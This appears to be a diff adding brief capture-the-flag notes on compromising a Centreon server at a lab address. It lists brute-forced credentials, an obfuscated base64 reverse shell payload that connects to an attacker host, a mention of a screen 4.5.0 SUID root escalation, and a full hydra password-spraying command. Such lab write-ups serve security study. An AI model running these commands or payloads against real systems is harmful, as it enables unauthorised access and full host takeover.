@@ -1,0 +1,30 @@
+http://10.10.10.157/centreon/index.php
+
+by changing the request method using burp, GET to -> POST method works.
+
+useralias=root&password=root&submitLogin=Connect&centreon_token=fd657e75e96104dce12bd4fb281371f3
+
+
+creds for /centreon/index.php
+usernme: admin
+password: password1
+
+
+
+-> using anti-csrf brute force to get centreon creds.
+
+-> using echo${IFS}YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS4zOS8xMTIyIDA+JjEK${IFS}|${IFS}base64${IFS}-d${IFS}|${IFS}bash;
+	 (echo bash -i >& /dev/tcp/10.10.15.39/1122 0>&1)
+
+
+  write in poller to and using burp to generate the shell( in export configuration )
+
+  or using the wget method
+
+
+root : screenroot.sh to root , trolling lol
+suid screen 4.5.0
+
+
+new way to brute force the creds:
+hydra -T 32 -w 20 -l admin -P ./rockyou.txt -V -s 80 10.10.10.157 http-post-form "/centreon/api/index.php?action=authenticate:username=^USER^&password=^PASS^:Bad credentials" -f -o ./hydra_centreon_api_rock.txt -I
